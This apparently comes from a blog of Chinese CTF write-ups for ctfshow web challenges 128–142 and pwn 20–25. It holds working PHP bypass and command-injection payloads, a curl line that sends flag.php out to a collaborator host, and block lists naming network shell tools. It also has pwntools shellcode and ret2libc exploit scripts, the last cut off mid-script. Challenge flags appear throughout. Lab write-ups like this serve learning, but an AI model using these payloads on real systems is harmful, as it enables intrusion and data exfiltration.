<p>ctfshow{1bfb2e20-7d56-40ba-b1ff-8c1289186722}</p>
<h1>web128</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目的正则要求f1不存在字母数字，v2无限制。</p>
<p>calluser_func：第一个参数是被调用的回调函数，其余参数是回调函数的参数。</p>
<p>var_dump：打印变量的相关信息</p>
<p>gettext():__<em>()是gettext()的拓展函数 在开启相关设定后，</em>(“666”)等价于gettext(“666”)，且就返回其中的参数</p>
<p>get_defined_vars：返回由所有已定义变量所组成的数组，因为包含了flag.php，所以flag.php里面肯定有$flag储存了flag。</p>
<p>?f1=_&amp;f2=get_defined_vars</p>
<p>var_dump(call_user_func(call_user_func($f1,$f2)));<br>
=&gt; var_dump(call_user_func(call_user_func(_,‘get_defined_vars’)));<br>
=&gt; var_dump(call_user_func(get_defined_vars));</p>
<p>ctfshow{a8ba5b1e-f162-46b1-aa12-bc88b1159f36}</p>
<h1>web129</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?f=php://filter/|ctfshow/resource=flag.php</p>
<p>应该是没有过滤器ctfshow，这里就是为了过去stripos()函数</p>
<p>stripos()用于查找一个字符串在另一个字符串中首次出现的位置，忽略大小写。</p>
<p>wp给了好多方法</p>
<p>GET传参：</p>
<p>//查看源码<br>
?f=php://filter/|ctfshow/resource=flag.php<br>
?f=/ctfshow/…/…/…/…/…/…/…/var/www/html/flag.php<br>
?f=./ctfshow/…/flag.php</p>
<p>//直接回显base64<br>
?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</p>
<p>ctfshow{2ac556be-32a9-4647-a0ca-5721ba627b25}</p>
<h1>web130</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>preg_match不识别数组，否则返回false</p>
<p>stripos()遇到数组会返回null,null!=false,所以可以绕过stripos函数</p>
<p>post:</p>
<p>f[]=</p>
<p>.表示任意单个字符，+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复。</p>
<p>post:</p>
<p>f=ctfshow</p>
<p>f=ctfshow,即可绕过preg_match函数。同时，if(0 === flase)返回值为false，0不是强等于false的，所以也不满足if(stripos($f, ‘ctfshow’) === FALSE)</p>
<p>ctfshow{a3819496-3fb6-41d5-bf1d-29d4f6dbd81f}</p>
<h1>web131</h1>
<p>需要跑脚本，略</p>
<h1>web132</h1>
<p>需要用dirsearch搜</p>
<p>我这里的代码是：</p>
<p>C:\Users\ssz\AppData\Local\Programs\Python\Python312\dirsearch-master<br>
python <a href="http://dirsearch.py">dirsearch.py</a> -u <a href="https://fcdcc901-047a-4270-9a98-da68f6613c74.challenge.ctf.show/">https://fcdcc901-047a-4270-9a98-da68f6613c74.challenge.ctf.show/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>||<code>优先级低于</code>&amp;&amp;</p>
<p>就是说，先进行和的运算&amp;&amp;</p>
<p>但是在和运算之后，再进行||</p>
<p>那么他只需要||后面的成立即可</p>
<p>?code=admin&amp;password=123&amp;username=admin</p>
<p>ctfshow{83312124-29dd-45b6-81c7-91c03495e5b5}</p>
<h1>web133</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">传入?F=`<span class="variable">$F</span>` ;sleep <span class="number">3</span>  <span class="comment">//此时不被正则过滤，程序中$F=`$F` ;sleep 3</span></span><br><span class="line">经过<span class="title function_ invoke__">substr</span>()函数截断，那行代码变成<span class="keyword">eval</span>(`<span class="variable">$F</span>` ;);</span><br><span class="line">之前说了，程序中<span class="variable">$F</span>=`<span class="variable">$F</span>` ;sleep <span class="number">3</span></span><br><span class="line">那行代码就是<span class="keyword">eval</span>(`     `<span class="variable">$F</span>`;+sleep <span class="number">3</span>      `;);</span><br><span class="line">所以执行了sleep <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同理可以构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>` ;ls /</span><br><span class="line">?F=`<span class="variable">$F</span>` ;tac /f*</span><br></pre></td></tr></table></figure>
<p>这样是没有回显的</p>
<p>打开bp的collaborator，复制到剪切板</p>
<p>payload: curl -X POST -F xx=@flag.php <a href="http://xxx">http://xxx</a></p>
<p>后面的xxx改为复制的东西，然后再刷新一下就有了</p>
<p><img src="image-20250126220545190.png" alt="image-20250126220545190"></p>
<p>ctfshow{e58de84c-ac21-4c84-b90d-c612cf054006}</p>
<h1>web134</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>parse_str()：将字符串解析成多个变量(示例来自chatgpt)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;user[name]=John&amp;user[age]=30&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$query</span>, <span class="variable">$output</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出解析后的数组</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [user] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; John</span><br><span class="line">            [age] =&gt; <span class="number">30</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>extract()：从数组中将变量导入到当前的符号表</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;New York&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 extract() 将数组元素转换为变量</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;  <span class="comment">// 输出: John</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;   <span class="comment">// 输出: 30</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$city</span>;  <span class="comment">// 输出: New York</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>
<p>$_SERVER[‘QUERY_STRING’]是全局变量，存储了 URL 中查询字符串的部分（即 <code>?</code> 后的部分）</p>
<p><strong><code>parse_str($_SERVER['QUERY_STRING'])</code></strong> 会解析这个查询字符串，并将其转换为 <code>$_POST</code> 数组中的数据（即使数据是通过 GET 请求传递的）。</p>
<p>payload的解释：我们传进去之后他正好绕过了第一个if函数体。然后经过parse_str()和$_SERVER[‘QUERY_STRING’]把我们?后面的的部分当作post传来的数组储存起来，就是通过parse_str()包括的内部东西会被当做post。然后后面的extract()函数会把我们传入的东西加上$，当作变量，然后就相当于传入了相应的key，最后拿到flag。我们需要看源码。</p>
<p>ctfshow{9e94d52f-22ec-4266-9a50-0bd15766e46d}</p>
<h1>web135</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?F=<code>$F</code> ;cp flag.php 1.txt<br>
?F=<code>$F</code> ;nl flag.php&gt;1.txt<br>
?F=<code>$F</code> ;mv flag.php 1.txt</p>
<p>ctfshow{0ee326bd-a1b7-40d7-ba5c-0c6ae7e1cc7f}</p>
<h1>web136</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>linux tee命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo &quot;Hello, world!&quot; | tee output.txt					将Hello, world!弄到txt文件中</span><br><span class="line">$ echo &quot;Hello again!&quot; | tee -a output.txt				-a为追加</span><br><span class="line">$ echo &quot;This is important!&quot; | tee file1.txt file2.txt	弄到多个文件</span><br></pre></td></tr></table></figure>
<p>?c=ls /|tee 1发现有flag文件</p>
<p>f149_15_h3r3</p>
<p>?c=tac /f149_15_h3r3|tee 2</p>
<p>ctfshow{5b5c2d9a-c827-4c31-88d3-3dca44d122bf}</p>
<h1>web137</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>调用cyfshow类中getFlag()方法。</p>
<p>php中 -&gt;与:: 调用类中的成员的区别：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line"></span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法</span><br></pre></td></tr></table></figure>
<p>双冒号可以不用实例化类就可以直接调用类中的方法</p>
<p>ctfshow=ctfshow::getFlag</p>
<p>ctfshow{f3dd2e35-e4e2-4d4b-bd5b-32e000547bd9}</p>
<h1>web138</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p><code>strripos()</code> 是 PHP 中的一个函数，计算指定字符串在目标字符串中最后一次出现的位置，用于查找 <strong>字符串</strong> 在另一个字符串中最后一次出现的位置，<strong>不区分大小写</strong>。它与 <code>strrpos()</code> 类似，区别在于 <code>strripos()</code> 会忽略大小写，而 <code>strrpos()</code> 区分大小写。</p>
<p>call_user_func函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。</p>
<p>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</p>
<p>ctfshow{30dacf69-8c78-4a8e-9930-156604fa0ae2}</p>
<h1>web139</h1>
<p>毛病</p>
<h1>web140</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题我们最终要使intval($code) == 'ctfshow’成立</p>
<p>intval()函数会把非数字的字符转换为零</p>
<p>那么我们只需要code为零即可</p>
<p>f1=usleep&amp;f2=usleep<br>
f1=md5&amp;f2=phpinfo<br>
f1=md5&amp;f2=sleep<br>
f1=md5&amp;f2=md5<br>
f1=current&amp;f2=localeconv<br>
f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数字所以我们改用sha1</p>
<p>ctfshow{4d5a17a5-b054-4ffa-bb28-4e5822a7f3c5}</p>
<h1>web141</h1>
<p>无</p>
<p>数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code></p>
<h1>web142</h1>
<p>0</p>
<p>ctfshow{48e932d7-ed2c-4fad-8bda-caa18de9bfb9}</p>
]]></content>
  </entry>
  <entry>
    <title>pwn20-</title>
    <url>/2025/01/21/pwn20/</url>
    <content><![CDATA[<h1>pwn20、21、22</h1>
<p><a href="https://blog.csdn.net/linyt/article/details/51635768">https://blog.csdn.net/linyt/article/details/51635768</a></p>
<p><a href="https://linyt.blog.csdn.net/article/details/51636753">https://linyt.blog.csdn.net/article/details/51636753</a></p>
<p><a href="https://linyt.blog.csdn.net/article/details/51637832">https://linyt.blog.csdn.net/article/details/51637832</a></p>
<p>.got和.got.plt是否可写</p>
<p>checksec当中的RELRO与此有关，</p>
<p><img src="wps2.jpg" alt="img"></p>
<table>
<thead>
<tr>
<th>当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</th>
</tr>
</thead>
<tbody>
<tr>
<td>当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</td>
</tr>
<tr>
<td>当RELRO为No RELRO时，表示.got与.got.plt都可写。</td>
</tr>
</tbody>
</table>
<p>根据checksec得知flag的前半部分</p>
<table>
<thead>
<tr>
<th>20:1 1</th>
</tr>
</thead>
<tbody>
<tr>
<td>21:0 1</td>
</tr>
<tr>
<td>22:0 0</td>
</tr>
</tbody>
</table>
<p>Readelf -S pwn找到flag后半部分</p>
<table>
<thead>
<tr>
<th>20:0x600f18、0x600f28</th>
</tr>
</thead>
<tbody>
<tr>
<td>21:0x600ff0_0x601000</td>
</tr>
<tr>
<td>22:0x600fc0</td>
</tr>
</tbody>
</table>
<p>按题目要求拼接flag即可</p>
<h1>pwn23</h1>
<p>我觉得这道题不应该出现在这里，或者出现在这里就是让大家了解一下栈溢出</p>
<p>连接之后可以直接进行操作，…/ls</p>
<p>发现ctfshow_flag可以直接cat，但是这里不行</p>
<p>file和checksec一下，32，进去ida跟进ctfshow，发现strcpy函数，此函数不会限制大小，但其里面有dest上方限制了大小为58，可以栈溢出(0x3Eh+0x4)</p>
<p>至于为什么栈溢出之后会出现flag：</p>
<p>ida上面还有一段代码  signal(11, (__sighandler_t)sigsegv_handler);</p>
<p><img src="wps3.jpg" alt="img"></p>
<p>简单来说就是我们利用了栈溢出，这段代码检测出了我们这种非法行为，然后就运行sigsegv_handler这个函数，而这个函数正好可以打印出来flag</p>
<p><img src="wps4.jpg" alt="img"></p>
<p>这个内容在pwn35当中还会出现</p>
<h1>pwn24</h1>
<p>题目提示：你可以使用pwntools的shellcraft模块来进行攻击</p>
<p>这道题大致应该是让我们认识一下shell和exp</p>
<p>先解释一下shell：相当于我们windows上面的cmd</p>
<p>exp是我们利用程序漏洞，编写出的可以拿到服务端的shell的代码</p>
<p>例如本题拿到shell的exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import * //引入pwn库</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28155&quot;) //远程连接xxx的xxx端口</span><br><span class="line"></span><br><span class="line">shell = asm(shellcraft.sh()) //创建shellcraft模块进行连接</span><br><span class="line"></span><br><span class="line">p.sendline(shell) //将shell发送给服务端</span><br><span class="line"></span><br><span class="line">p.interactive() //与服务端进行交互（cat flag......）</span><br></pre></td></tr></table></figure>
<p>其他作者的wp里面没有说明为什么写一个shell就可以拿到flag，但有一个作者提到了ret2text题型，之后可以看一下</p>
<p>ctfshow{82d73717-57b0-4b24-a66b-4d916886d6b3}</p>
<h1>pwn25</h1>
<p>ret2libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28111&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将输出的puts的地址赋给puts_addr</span></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="comment"># 中间填充4个a是为了使栈上的数据对齐，直接写 /bin/sh 